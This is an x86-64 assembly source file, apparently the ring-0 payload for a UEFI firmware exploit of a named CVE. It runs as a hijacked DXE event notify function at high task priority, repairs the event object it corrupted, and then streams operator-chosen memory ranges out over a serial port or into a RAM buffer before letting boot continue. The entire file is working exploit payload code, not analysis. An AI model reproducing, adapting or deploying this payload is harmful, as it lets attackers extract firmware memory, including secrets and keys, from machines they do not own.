# payload.S - ring-0 DXE payload for CVE-2026-97631 (GHSA-99cj-7hg9-mp4m)
#
# Entered as NotifyFunction(EFI_EVENT Event /*rcx*/, VOID *Context /*rdx*/)
# from CoreSignalEvent() at TPL_HIGH_LEVEL, inside the DXE core, on the
# firmware's own stack.
#
# Rules this payload lives by:
#
#   * no Boot Services call that allocates, logs, or takes a lock
#   * no IDT/GDT/CR/MSR edits, no interrupt hooks, no debug registers
#   * touch only our own parameter block, the IEVENT we already own, and the
#     memory the operator explicitly asked for
#   * put the IEVENT back from its pristine snapshot *before* doing any work,
#     so the object is already clean while the dump runs
#   * return EFI_SUCCESS and let the firmware finish booting
#
# Output is polled 16550-compatible UART (no interrupts, no firmware buffers)
# and/or an operator-supplied RAM sink.
#
# Stream format, all 64-bit fields most-significant byte first:
#
#   C0 DE <event> <graft>              open
#   C1 <start> <end> <data...>         one per range, end exclusive
#   C0 DE <event> <graft>              close, only if we got to the end
#
# Intel syntax, Microsoft x64 ABI, position independent, no relocations.

        .intel_syntax noprefix
        .text

        .set PP_MAGIC,        0x00
        .set PP_GST,          0x08
        .set PP_EVT,          0x10
        .set PP_SHADOW,       0x18
        .set PP_UART,         0x20
        .set PP_UART_STRIDE,  0x28
        .set PP_OUT_BUF,      0x30
        .set PP_OUT_CAP,      0x38
        .set PP_RANGES,       0x40
        .set PP_RANGE_N,      0x48
        .set SHADOW_LEN,      0x48

        .globl  payload_start
        .globl  payload_end

payload_start:
        push    rbx
        push    rbp
        push    rsi
        push    rdi
        push    r12
        push    r13
        push    r14
        push    r15
        pushfq

        mov     r14, rdx                    # parameter block
        test    r14, r14
        jz      .Lret_ok

        mov     rax, 0x504d4b4f312d4445     # "ED-1OKMP"
        cmp     qword ptr [r14 + PP_MAGIC], rax
        jne     .Lret_ok

        # ---- restore the IEVENT from its pristine copy ------------------
        mov     rsi, qword ptr [r14 + PP_SHADOW]
        mov     rdi, qword ptr [r14 + PP_EVT]
        test    rsi, rsi
        jz      .Lno_shadow
        test    rdi, rdi
        jz      .Lno_shadow
        mov     ecx, SHADOW_LEN
        rep movsb
.Lno_shadow:

        # ---- resolve sinks ---------------------------------------------
        mov     r12, qword ptr [r14 + PP_UART]
        mov     r13, qword ptr [r14 + PP_UART_STRIDE]
        test    r13, r13
        jnz     .Lstride_ok
        mov     r13, 1
.Lstride_ok:
        mov     r10, qword ptr [r14 + PP_OUT_BUF]
        test    r10, r10
        jz      .Lno_mem
        mov     r11, qword ptr [r14 + PP_OUT_CAP]
        add     r11, r10
        jmp     .Lopen
.Lno_mem:
        xor     r11d, r11d

        # ---- open frame -------------------------------------------------
.Lopen:
        mov     al, 0xc0
        call    .Lemit
        mov     al, 0xde
        call    .Lemit
        mov     rax, qword ptr [r14 + PP_EVT]
        call    .Lemitq
        mov     rax, qword ptr [r14 + PP_GST]
        call    .Lemitq

        # ---- ranges -----------------------------------------------------
        mov     rbx, qword ptr [r14 + PP_RANGES]
        mov     rbp, qword ptr [r14 + PP_RANGE_N]
        test    rbx, rbx
        jz      .Lclose
        test    rbp, rbp
        jz      .Lclose

.Lrange_loop:
        mov     rsi, qword ptr [rbx]        # start
        mov     rdi, qword ptr [rbx + 8]    # end, exclusive
        add     rbx, 16
        cmp     rdi, rsi
        jbe     .Lnext_range

        push    rbx                         # block header
        push    rdi
        mov     al, 0xc1
        call    .Lemit
        mov     rax, rsi
        call    .Lemitq
        pop     rax                         # end
        push    rax
        call    .Lemitq
        pop     rdi
        pop     rbx

.Lcopy_loop:
        mov     rax, qword ptr [rsi]
        call    .Lemitq
        add     rsi, 8
        cmp     rsi, rdi
        jb      .Lcopy_loop

.Lnext_range:
        dec     rbp
        jnz     .Lrange_loop

        # ---- close frame: proves the whole dump was written --------------
.Lclose:
        mov     al, 0xc0
        call    .Lemit
        mov     al, 0xde
        call    .Lemit
        mov     rax, qword ptr [r14 + PP_EVT]
        call    .Lemitq
        mov     rax, qword ptr [r14 + PP_GST]
        call    .Lemitq

.Lret_ok:
        xor     eax, eax                    # EFI_SUCCESS
        popfq
        pop     r15
        pop     r14
        pop     r13
        pop     r12
        pop     rdi
        pop     rsi
        pop     rbp
        pop     rbx
        ret

# ---------------------------------------------------------------------------
# .Lemit   AL -> UART then RAM sink.  Preserves RAX/RCX/RDX/R8.
# .Lemitq  RAX -> 8 bytes big-endian.  Preserves all general registers.
#
# The UART poll is bounded: a board whose "COM1" is not a working 16550 would
# otherwise spin forever at TPL_HIGH inside CoreSignalEvent and hang the boot.
# After the budget runs out the UART is dropped for the rest of the run and the
# payload carries on with the RAM sink (or with nothing, and just returns).
# ---------------------------------------------------------------------------
.Lemit:
        push    rax
        push    rcx
        push    rdx
        push    r8
        test    r12, r12
        jz      .Le_mem
        mov     rdx, r12
        add     rdx, 5                      # LSR
        mov     r8d, 0x8000                 # poll budget
.Le_txw:
        movzx   ecx, byte ptr [rdx]
        test    cl, 0x20                    # THRE
        jnz     .Le_tx_ok
        dec     r8d
        jnz     .Le_txw
        xor     r12d, r12d                  # UART unresponsive: give up on it
        jmp     .Le_mem
.Le_tx_ok:
        mov     rcx, r12
        mov     byte ptr [rcx], al          # THR
.Le_mem:
        test    r10, r10
        jz      .Le_out
        cmp     r10, r11
        jae     .Le_out
        mov     byte ptr [r10], al
        inc     r10
.Le_out:
        pop     r8
        pop     rdx
        pop     rcx
        pop     rax
        ret

.Lemitq:
        push    rax
        push    rcx
        push    rdx
        push    r8
        mov     rdx, rax
        mov     ecx, 8
.Lq_loop:
        rol     rdx, 8                      # MSB into AL
        mov     rax, rdx
        movzx   eax, al
        call    .Lemit
        dec     ecx
        jnz     .Lq_loop
        pop     r8
        pop     rdx
        pop     rcx
        pop     rax
        ret

payload_end:
        .section .note.GNU-stack,"",@progbits
